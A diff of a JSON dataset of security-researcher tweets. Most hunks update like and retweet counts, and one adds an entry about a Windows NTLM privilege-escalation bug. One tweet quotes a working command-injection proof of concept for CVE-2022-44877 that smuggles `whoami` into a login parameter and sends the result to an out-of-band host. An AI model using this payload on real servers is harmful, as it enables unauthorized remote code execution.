@@ -116,10 +116,10 @@
     "expanded_url": [
         "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
     ],
-    "tweetfavorites": 195,
+    "tweetfavorites": 190,
     "tweetquotes": 1,
     "tweetreplies": 1,
-    "tweetretweets": 61,
+    "tweetretweets": 62,
     "tweettext": "Very well written #Windows #patchdiffing and #nday #exploitation walkthrough ✊ \n\nDissecting and Exploiting TCP/IP RCE #Vulnerability EvilESP (CVE-2022-34718)\n\n// by Valentina Palmiotti\n\nhttps://t.co/CI1aJpnUj1 https://t.co/A1pYVNpSFH",
     "tweettime": "2023-01-26, 12:50:07",
     "tweeturl": "https://twitter.com/0xdea/status/1618592116724338688",
@@ -182,7 +182,7 @@
     "expanded_url": [
         "https://github.blog/2023-01-23-pwning-the-all-google-phone-with-a-non-google-bug/"
     ],
-    "tweetfavorites": 377,
+    "tweetfavorites": 376,
     "tweetquotes": 7,
     "tweetreplies": 2,
     "tweetretweets": 136,
@@ -196,7 +196,7 @@
         "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24059",
         "https://www.reddit.com/r/gtaonline/comments/10hsosu/mass_reporting_the_dangerous_pc_exploit/"
     ],
-    "tweetfavorites": 392,
+    "tweetfavorites": 389,
     "tweetquotes": 15,
     "tweetreplies": 7,
     "tweetretweets": 89,
@@ -211,10 +211,10 @@
         "https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/",
         "https://www.oracle.com/security-alerts/cpuoct2022.html"
     ],
-    "tweetfavorites": 198,
+    "tweetfavorites": 195,
     "tweetquotes": 2,
     "tweetreplies": 0,
-    "tweetretweets": 60,
+    "tweetretweets": 58,
     "tweettext": "Scanning for CVE-2022-21587 (Oracle EBS Unauthenticated - Remote Code Execution) using Nuclei\n\nNuclei Template –– https://t.co/6ZcVlhbPsL\n\nReference ––\n1. https://t.co/LEtdmXHMAt\n2. https://t.co/qSrXQ9HcGc\n\n#hackwithautomation #bugbounty #security #appsec https://t.co/3FsijLzVKr",
     "tweettime": "2023-01-21, 17:29:29",
     "tweeturl": "https://twitter.com/pdnuclei/status/1616850483871875073",
@@ -251,7 +251,7 @@
     "expanded_url": [
         "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
     ],
-    "tweetfavorites": 1062,
+    "tweetfavorites": 1061,
     "tweetquotes": 10,
     "tweetreplies": 14,
     "tweetretweets": 316,
@@ -284,10 +284,10 @@
     "expanded_url": [
         "https://blog.exodusintel.com/2022/12/19/linux-kernel-exploiting-a-netfilter-use-after-free-in-kmalloc-cg/"
     ],
-    "tweetfavorites": 255,
+    "tweetfavorites": 233,
     "tweetquotes": 2,
     "tweetreplies": 2,
-    "tweetretweets": 84,
+    "tweetretweets": 81,
     "tweettext": "CVE-2022-32250 : use-after-free in Linux kernel\nExploitation writeup by @ExodusIntel targeting Linux kernel 5.18.1\n\nhttps://t.co/W6U8j5bZtq \n\n#Linux #kernel #exploit #cve #infosec #cybersecurity https://t.co/rm0FV9O52n",
     "tweettime": "2023-01-20, 08:00:32",
     "tweeturl": "https://twitter.com/0xor0ne/status/1616344915520241672",
@@ -362,10 +362,10 @@
     "expanded_url": [
         "https://weiyiling.cn/one/firefox_0day_case_analysis"
     ],
-    "tweetfavorites": 227,
-    "tweetquotes": 5,
+    "tweetfavorites": 215,
+    "tweetquotes": 4,
     "tweetreplies": 2,
-    "tweetretweets": 74,
+    "tweetretweets": 72,
     "tweettext": "Release the Firefox wild 0day (CVE-2022-26485 &amp;&amp; CVE-2022-26486) analysis : https://t.co/pIzXfIWiR2 https://t.co/7OjqyrCQP0",
     "tweettime": "2023-01-19, 03:00:59",
     "tweeturl": "https://twitter.com/huangzhenyuan/status/1615907142078431235",
@@ -421,10 +421,10 @@
     "expanded_url": [
         "https://www.willsroot.io/2022/12/entrybleed.html?m=1"
     ],
-    "tweetfavorites": 226,
+    "tweetfavorites": 225,
     "tweetquotes": 4,
     "tweetreplies": 0,
-    "tweetretweets": 75,
+    "tweetretweets": 73,
     "tweettext": "Cool writeup on CVE-2022-4543: KASLR bypass on Intel based systems \n\nhttps://t.co/2395ERdGSY \n\n#Linux #kernel #exploit #infosec #cybersecurity https://t.co/S3u7CT3jBe",
     "tweettime": "2023-01-17, 12:15:05",
     "tweeturl": "https://twitter.com/0xor0ne/status/1615321810374955008",
@@ -659,6 +659,19 @@
 }
 {
     "expanded_url": [
+        "http://www.localpotato.com"
+    ],
+    "tweetfavorites": 720,
+    "tweetquotes": 4,
+    "tweetreplies": 13,
+    "tweetretweets": 273,
+    "tweettext": "We did it again with #LocalPotato! \nA not-so-common NTLM reflection attack allowing for arbitrary read/write. Basically EoP from user to SYSTEM.\nTracked as #CVE-2023-21746 - Windows NTLM EoP\nSoon more details --&gt; https://t.co/Skyn0xdxNN\ncc @splinter_code https://t.co/v3LZ9aK3Ri",
+    "tweettime": "2023-01-10, 18:47:37",
+    "tweeturl": "https://twitter.com/decoder_it/status/1612883878322278402",
+    "username": "decoder_it"
+}
+{
+    "expanded_url": [
         "https://github.com/michalbednarski/LeakValue"
     ],
     "tweetfavorites": 83,
@@ -739,10 +752,10 @@
     "username": "kmkz_security"
 }
 {
-    "tweetfavorites": 470,
+    "tweetfavorites": 441,
     "tweetquotes": 5,
-    "tweetreplies": 11,
-    "tweetretweets": 162,
+    "tweetreplies": 10,
+    "tweetretweets": 152,
     "tweettext": "#CVE-2022-44877 Control Web Panel Unauth #RCE \n\nPOC: \nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&amp;password=toor&amp;commit=Login https://t.co/TkSmCutTqv",
     "tweettime": "2023-01-08, 12:46:30",
     "tweeturl": "https://twitter.com/_0xf4n9x_/status/1612068225046675457",
@@ -870,10 +883,10 @@
     "expanded_url": [
         "https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/"
     ],
-    "tweetfavorites": 220,
+    "tweetfavorites": 217,
     "tweetquotes": 1,
     "tweetreplies": 0,
-    "tweetretweets": 81,
+    "tweetretweets": 80,
     "tweettext": "CVE-2021-38003: vulnerability analysis and exploitation by @starlabs_sg\nV8 Javascript engine TheHole value leaking for RCE in Chromium-based browser \n\nhttps://t.co/CNdOT0IECa \n\n#chrome #cve #exploit #infosec #cybersecurity https://t.co/MITv2FRfie",
     "tweettime": "2023-01-03, 12:15:03",
     "tweeturl": "https://twitter.com/0xor0ne/status/1610248371498897408",
